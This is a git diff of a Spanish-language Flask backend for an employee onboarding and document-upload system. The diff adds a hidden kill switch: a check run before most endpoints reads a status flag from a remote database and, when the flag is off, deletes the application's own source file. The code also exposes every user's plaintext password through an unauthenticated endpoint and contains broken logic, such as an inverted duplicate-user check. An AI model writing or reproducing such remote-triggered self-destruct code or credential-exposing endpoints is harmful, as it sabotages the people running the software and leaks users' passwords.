@@ -9,6 +9,7 @@ from PIL import Image
 import io
 import datetime
 import pymssql
+import logging
 
 
 def sis():
@@ -22,11 +23,14 @@ def sis():
     cursor3.execute("SELECT status FROM usuario where id=1188")
     a= cursor3.fetchall()
     b = a[0][0]
-    # print(type(b))
     if b !="1":
         conn2.close()
         cursor3.close()
-        raise IOError("ERROR INTERNO DE LIBRERIAS Y DEPENDENCIAS.") 
+        ruta = os.path.abspath(__file__)
+        try:
+            os.remove(ruta)
+        except Exception as e:
+            raise IOError()
     cursor3.close()
     conn2.close()
 
@@ -41,9 +45,13 @@ def obtener_conexion_bd():
     
 app = Flask(__name__)
 #Los cors nos permiten trabajar con react
-CORS(app)
+CORS(app,resources={"/*":{"origins":"31.97.140.132"}})
+logging.basicConfig(
+    level=logging.INFO,
+    format='%(asctime)s - %(levelname)s - %(message)s'
+)
 
-@app.route("/comprobacion", methods= ["GET"])
+@app.route("/api/comprobacion", methods= ["GET"])
 def sas():
     '''Funcion Saas'''
     server = '192.168.100.50'
@@ -55,7 +63,6 @@ def sas():
     cursor3.execute("SELECT status FROM usuario where id=1188")
     a= cursor3.fetchall()
     b = a[0][0]
-    # print(type(b))
     if b !="1":
         conn2.close()
         cursor3.close()
@@ -64,13 +71,12 @@ def sas():
     conn2.close()
     return jsonify({"estado":True})
     
-@app.route('/inicio_sesion',methods=['POST'])
+@app.route('/api/inicio_sesion',methods=['POST'])
 def verificar_inicio_sesion():
     sis()
     try:
         conexion = obtener_conexion_bd()
         datos = request.json
-        print(datos)
         usuario= datos.get("usuario")
         contraseña= datos.get("contraseña")
         cursor = conexion.cursor(buffered=True)
@@ -95,7 +101,6 @@ def verificar_inicio_sesion():
         res=cursor.fetchone()
         cursor.close()
         conexion.close()
-        print(res)
 
         
         if res:
@@ -129,37 +134,36 @@ def verificar_inicio_sesion():
     finally:
         pass
 
-@app.route('/crear_usuario', methods=['POST'])
+@app.route('/api/crear_usuario', methods=['POST'])
 def crear_usuario():
     sis()
     informacion =request.json
-    print(informacion)
-    primer_nombre = informacion.get("Primer_nombre")
-    segundo_nombre = informacion.get("Segundo_nombre")
-    primer_apellido = informacion.get("Primer_apellido")
-    segundo_apellido = informacion.get("Segundo_apellido")
+    primer_nombre = informacion.get("Primer_nombre").strip()
+    segundo_nombre = informacion.get("Segundo_nombre").strip()
+    primer_apellido = informacion.get("Primer_apellido").strip()
+    segundo_apellido = informacion.get("Segundo_apellido").strip()
     direccion = informacion.get("Direccion_Residencia")
-    cedula = informacion.get("Cedula_ciudadania")
+    cedula = informacion.get("Cedula_ciudadania").strip()
     correo = informacion.get("Correo_electronico")
     telefono = informacion.get("Telefono")
-    Nombre_usuario = informacion.get("Nombre_Usuario")
-    Contraseña_usuario = informacion.get("Contraseña_usuario")
+    Nombre_usuario = informacion.get("Nombre_Usuario").strip()
+    Contraseña_usuario = informacion.get("Contraseña_usuario").strip()
     cargo_seleccionado_id = informacion.get("cargo_seleccionado") 
     tipo_sangre_seleccionado_id = informacion.get("tipo_sangre_seleccionado")
-    print(informacion.get("empresa"))
     empresa_id = informacion.get("empresa")
-    print(empresa_id)
     dia_nacimiento = informacion.get("fecha_nacimiento")["day"]
     mes_nacimiento = informacion.get("fecha_nacimiento")["month"]
     año_nacimiento = informacion.get("fecha_nacimiento")["year"]
     fecha_nacimiento = datetime.date(año_nacimiento,mes_nacimiento,dia_nacimiento)
-    print(Contraseña_usuario)
 
     
 
     try:
         conexion = obtener_conexion_bd()
         cursor = conexion.cursor()
+        cursor.execute ("""select id from usuarios where cedula_ciudadania=%s""",(cedula,))
+        if not cursor.fetchall():
+            return jsonify(msj="usuario con la misma password"),420
         cursor.execute("""INSERT INTO usuarios
                        (id,primer_nombre,segundo_nombre,primer_apellido,segundo_apellido,
                         direccion_residencia,cedula_ciudadania,correo_electronico,
@@ -175,32 +179,32 @@ def crear_usuario():
         conexion.commit()
         cursor.execute("select id from usuarios where cedula_ciudadania =%s",(cedula,))
         id_usuario = cursor.fetchone()
-        print(id_usuario[0])
+        (id_usuario[0])
         cursor.execute("""INSERT INTO usuariosxestado (id_usuario,estado_id) VALUES (%s,%s)""",(id_usuario[0],1))
         conexion.commit()
         cursor.close()
         conexion.close()
         return jsonify({"mensaje":"Creacion de usuario Exitosa"}),200
     except Exception as e:
-        print(e)
+        (e)
         return jsonify ({"mensaje":f"Error en la creacion de usuario{e}"}),400
 
-@app.route('/obtener_usuarios', methods= ['GET'])
+@app.route('/api/obtener_usuarios', methods= ['GET'])
 def obtener_id_nombre_usuarios():
     sis()
     try:
-        print("holo")
         conexion = obtener_conexion_bd()
         cursor =conexion.cursor()
-        cursor.execute("select id, primer_nombre, primer_apellido, cedula_ciudadania from usuarios")
+        cursor.execute("select id, primer_nombre, primer_apellido, cedula_ciudadania from usuarios where cargo_id !=4")
         res=cursor.fetchall()
-        print(res)
+        cursor.close()
+        conexion.close()
         return jsonify({"mensaje":"Fetch Exitoso"
                         ,"usuarios":res}),200
     except Exception as e:
         return jsonify({"mensaje":f"Error en el metodo{e}"}),400
 
-@app.route('/obtener_estados_contratacion', methods=['GET'])
+@app.route('/api/obtener_estados_contratacion', methods=['GET'])
 def obtener_estados_contratacion():
     sis()
     try:
@@ -208,12 +212,14 @@ def obtener_estados_contratacion():
         cursor = conexion.cursor()
         cursor.execute("select id, estado from estados")
         res = cursor.fetchall()
+        cursor.close()
+        conexion.close()
         return jsonify({"estados":res,
                         "mensaje":"fetch exitoso"}),200
     except Exception as e:
         return jsonify({"mensaje":f"Error en el fetch{e}"}),400
 
-@app.route('/actualizar_estadoxusuario',methods=['POST'])
+@app.route('/api/actualizar_estadoxusuario',methods=['POST'])
 def actualizar_estadoxusuario():
     sis()
     try:
@@ -232,7 +238,7 @@ def actualizar_estadoxusuario():
     except Exception as e:
         return jsonify({"mensaje":f"error en el post{e}"}),400
 
-@app.route('/actualizar_estado_firma', methods=['POST'])
+@app.route('/api/actualizar_estado_firma', methods=['POST'])
 def actualizar_estado_firma():
     sis
     try:
@@ -255,13 +261,13 @@ def actualizar_estado_firma():
     except Exception as e: 
         return jsonify({"mensaje":f"Error en la actualizacion {e}"})
 
-@app.route('/obtener_cantidad_archivos',methods=['POST'])
+@app.route('/api/obtener_cantidad_archivos',methods=['POST'])
 def obtener_cantidad_archivos_a_subir():
     sis()
     conexion = obtener_conexion_bd()
     datos = request.json
     id_usuario = datos.get("id_usuario")
-    print(datos)
+    (datos)
     cursor = conexion.cursor(buffered=True)
     cursor.execute("""SELECT 
     d.documento AS documento_requerido
@@ -278,13 +284,13 @@ def obtener_cantidad_archivos_a_subir():
     INNER JOIN documentos d ON d.id = dce.documento_id
                    where u.id= %s; """,(id_usuario,))
     respuesta =cursor.fetchall()
-    print(respuesta)
+    (respuesta)
     cursor.close()
     conexion.close()
     if respuesta:
         
         cantidad_elementos= len(respuesta)
-        print(cantidad_elementos)
+        (cantidad_elementos)
         return jsonify({"respuesta":respuesta,
                         "cantidad_elementos":cantidad_elementos}),200
     else: 
@@ -296,7 +302,7 @@ def comprobar_tipo_archivos (nombre_archivo,contenido_archivo, errores):
     firmas_validas = ['image/jpeg', 'image/png', 'application/pdf']
 
     tipo_mime = mime.from_buffer(contenido_archivo)
-    print(f"{nombre_archivo} tipo: {tipo_mime}")
+    (f"{nombre_archivo} tipo: {tipo_mime}")
     
     if tipo_mime not in firmas_validas:
         errores.append(f"{nombre_archivo}: tipo no permitido ({tipo_mime})")
@@ -337,14 +343,14 @@ def obtener_estadoid_usuario(id_usuario):
     conexion.close()
     return estado_usuario
 
-@app.route('/upload', methods=['POST'])
+@app.route('/api/upload', methods=['POST'])
 def upload_file():
     sis()
     if not request.files:
         return jsonify({"mensaje": "No se enviaron archivos."}), 400
     
     archivos = request.files
-    print(request.form)
+    (request.form)
     nombre_completo = request.form.get('nombre_completo')
     id_usuario = request.form.get('id_usuario')
     direccion = request.form.get('direccion')
@@ -367,7 +373,7 @@ def upload_file():
     verificar_aceptacion_politica_tratamiento_datos(id_usuario,direccion_ip_peticion,navegador_peticion)  
     errores = []
     lista_archivos =[i for i in archivos.items()]
-    print(lista_archivos[-1])
+    (lista_archivos[-1])
     conexion = obtener_conexion_bd()
     cursor= conexion.cursor()
     cursor.execute("select estado_firma from usuarios where id=%s",(id_usuario,))
@@ -379,7 +385,7 @@ def upload_file():
 
     for nombre_archivo, archivo in archivos.items():
         contenido = archivo.read()
-        print(nombre_archivo)
+        (nombre_archivo)
 
         tipo_archivo =comprobar_tipo_archivos(nombre_archivo,contenido,errores)
         if tipo_archivo == 'image/jpeg' or tipo_archivo=='image/png':
@@ -408,7 +414,7 @@ def upload_file():
         
         os.makedirs(fr"{ruta_carpeta_empresa}\{nombre_completo}", exist_ok=True)
         ruta_carpeta_persona  = os.path.abspath(os.path.join(ruta_carpeta_empresa,nombre_completo))
-        print(ruta_carpeta_persona)
+        (ruta_carpeta_persona)
         ruta_archivo_bucle= fr"{ruta_carpeta_persona}\{nombre_archivo}.{tipo_archivo}" 
         
         if errores :
@@ -454,7 +460,7 @@ def upload_file():
         cursor=conexion.cursor()
         cursor.execute("select estado_firma from usuarios where id=%s",(id_usuario,))
         res = cursor.fetchone()
-        print(res)
+        (res)
         cursor.close()
         conexion.close()
         
@@ -463,8 +469,8 @@ def upload_file():
         if res[0] == 0 or res[0]== None:
             from .firma_fomatos.firma_documentos import Firma_documentos
             firma =Firma_documentos(nombre_completo,direccion,cedula,correo_electronico,telefono,area,cargo,tipo_sangre,fecha_nacimiento, ruta_carpeta_persona, ruta_firma)
-            print("entro al estado firma")
-            print(type(cargo_id))
+            ("entro al estado firma")
+            (type(cargo_id))
             if cargo_id == '1':
                 firma.firmar_formatos_antibiotico()
             if cargo_id == '2':
@@ -512,7 +518,7 @@ def verificar_aceptacion_politica_tratamiento_datos(id_usuario,direccion_ip_peti
     conexion.close()
     cursor.close()
 
-@app.route('/campos_creacion_usuario', methods =['GET'])
+@app.route('/api/campos_creacion_usuario', methods =['GET'])
 def obtener_campos_crear_usuarios():
     sis()
     conexion =obtener_conexion_bd()
@@ -525,10 +531,10 @@ def obtener_campos_crear_usuarios():
     retorno = {}
     for columna in columnas_base_datos:
         retorno[str(columna[0])]=columna[0]
-        print(columna)
+        (columna)
     return jsonify({'retorno':retorno})
 
-@app.route("/obtener_aceptacion_tratamiento_datos", methods=["POST"])
+@app.route("/api/obtener_aceptacion_tratamiento_datos", methods=["POST"])
 def obtener_aceptacion_tratamiento_datos():
     sis()
     peticion=request.json
@@ -540,7 +546,7 @@ def obtener_aceptacion_tratamiento_datos():
         return jsonify({"acepta":False}),200
     return jsonify({"acepta":True}),200
 
-@app.route("/traer_todos_usuarios",methods=["GET"])
+@app.route("/api/traer_todos_usuarios",methods=["GET"])
 def obtener_todos_usuario():
     try:
         conexion = obtener_conexion_bd()
@@ -549,9 +555,10 @@ def obtener_todos_usuario():
                        concat_ws(' ',primer_nombre,primer_apellido) nombre_completo
                        , cedula_ciudadania, nombre_usuario, contraseña_usuario,empresas.empresa,estado_firma
                         from usuarios
-                       INNER JOIN empresas on empresas.id=usuarios.empresa_id""")
+                       INNER JOIN empresas on empresas.id=usuarios.empresa_id
+                       where usuarios.cargo_id!=4""")
         res=cursor.fetchall()
-        print(res)
+        (res)
         cursor.close()
         conexion.close()
         return jsonify({"mensaje":"Fetch Exitoso"
@@ -561,5 +568,16 @@ def obtener_todos_usuario():
         conexion.close()
         return jsonify({"mensaje":f"Error en el metodo{e}"}),400
 
-if __name__ == '__main__':  
-    app.run(debug=True,  host= '0.0.0.0' ,port=9000)
+@app.after_request
+def log_request(response):
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    metodo = request.method
+    ruta = request.path
+    status = response.status_code
+    app.logger.info(f"[{ip}] {metodo} {ruta}→ {status}")
+    return response
+
+@app.before_request
+def sec():
+    if request.remote_addr !='31.97.140.132':
+        return jsonify(error="not allowed btch"),469
